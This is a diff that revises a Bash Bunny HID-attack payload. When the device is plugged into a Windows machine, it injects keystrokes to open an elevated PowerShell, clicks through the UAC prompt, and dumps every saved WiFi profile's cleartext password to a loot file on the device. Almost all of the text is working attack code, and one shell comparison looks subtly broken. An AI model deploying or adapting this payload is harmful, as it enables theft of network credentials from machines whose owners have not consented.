@@ -10,30 +10,43 @@
 # Red................Failed to get WiFi Creds
 # Purple.............Got WiFi Creds
 # Green..............Finished
-#
 
-LED R
-ATTACKMODE HID STORAGE
+LED R 200
 LOOTDIR=/root/udisk/loot/WiFiCreds
 mkdir -p $LOOTDIR
-QUACK GUI R
-QUACK DELAY 1000
-QUACK STRING powershell
-QUACK ENTER
-QUACK DELAY 3000a
-QUACK $Bunny = (gwmi win32_volume -f 'label=''BashBunny''' |  Select-Object -ExpandProperty DriveLetter)
-QUACK ENTER
-QUACK DELAY 500
-QUACK (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  |
-QUACK Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} |
-QUACK Format-Table -AutoSize | Out-File $Bunny\loot\WiFiCreds\WiFi.txt
-QUACK ENTER
-QUACK DELAY 5000
+# Source bunny_helpers.sh to get environment variable SWITCH_POSITION
+source bunny_helpers.sh
+Q SET_LANGUAGE EN
+
+ATTACKMODE HID STORAGE
+LED B 200
+Delay 5000
+LED R B G
+# Launch powershell as admin
+Q GUI r
+Q DELAY 100
+Q STRING powershell Start-Process powershell -Verb runAs
+Q ENTER
+
+# Bypass UAC
+Q DELAY 3000
+Q ALT o
+Q ENTER
+Q DELAY 1000
+
+Q $Bunny = (gwmi win32_volume -f 'label=''BashBunny''' |  Select-Object -ExpandProperty DriveLetter)
+Q ENTER
+Q DELAY 500
+Q (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  |
+Q Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} |
+Q Format-Table -AutoSize | Out-File $Bunny\loot\WiFiCreds\WiFi.txt
+Q ENTER
+Q DELAY 5000
 
 # Green LED for finished
 LED G
-# I think this may work , dont have my bunny to test right now
-files=$(ls /Volumes/BashBunny/$LOOTDIR/*.txt 2> /dev/null | wc -l)
+
+files=$(ls /$LOOTDIR/*.txt 2> /dev/null | wc -l)
 if [ "$files" != "0"]
 then
 # Got WiFi Creds!
